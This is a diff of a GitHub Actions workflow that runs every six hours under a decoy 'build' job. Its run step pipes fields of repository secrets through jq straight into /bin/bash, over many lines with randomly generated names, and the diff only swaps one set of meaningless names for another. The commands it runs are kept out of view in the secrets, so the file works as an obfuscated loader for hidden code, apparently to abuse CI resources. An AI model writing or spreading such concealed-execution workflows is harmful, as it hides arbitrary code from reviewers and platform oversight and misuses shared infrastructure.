@@ -2,29 +2,25 @@ name: yanxiaosan1829
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
-jobs:  # 13582
+    - cron: '7 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yanxiaosan1829
         env:
-          hsx35: ${{ secrets.hsx35 }}
+          u020: ${{ secrets.u020 }}
         run: |
-          echo $hsx35 | jq -r .twd90 | /bin/bash
-          echo $cfb5042 | jq -r .j814 | /bin/bash
-          echo $rtx9190 | jq -r .v90363 | /bin/bash
-          echo $mnz6552 | jq -r .uhhr76312 | /bin/bash
-          echo $img2 | jq -r .om87 | /bin/bash
-          echo $dwic8 | jq -r .syagc244 | /bin/bash
-          echo $vfx3 | jq -r .x8776 | /bin/bash
-          echo $tmfc90377 | jq -r .icnn2 | /bin/bash
-          echo $cdeu3 | jq -r .g96 | /bin/bash
-          echo $jc6174 | jq -r .j32130 | /bin/bash
-          echo $xbjx921 | jq -r .cpc5121 | /bin/bash
-          echo $fhmx12484 | jq -r .r26 | /bin/bash
-          echo $lrejq2 | jq -r .hkbtq31 | /bin/bash
-          echo $n7 | jq -r .utku62787 | /bin/bash
-          echo $o4 | jq -r .ynv2 | /bin/bash
+          echo $u020 | jq -r .hama45 | /bin/bash
+          echo $k79161 | jq -r .dwd82992 | /bin/bash
+          echo $o25 | jq -r .u42124 | /bin/bash
+          echo $kbi3214 | jq -r .eui926 | /bin/bash
+          echo $qfnsr1120 | jq -r .yxuu933 | /bin/bash
+          echo $wj87 | jq -r .ig4113 | /bin/bash
+          echo $ifjci28919 | jq -r .daazu6051 | /bin/bash
+          echo $jko6260 | jq -r .mkhhf040 | /bin/bash
+          echo $qjpyr29890 | jq -r .ywjh19091 | /bin/bash
+          echo $u4175 | jq -r .mpkwu740 | /bin/bash
 
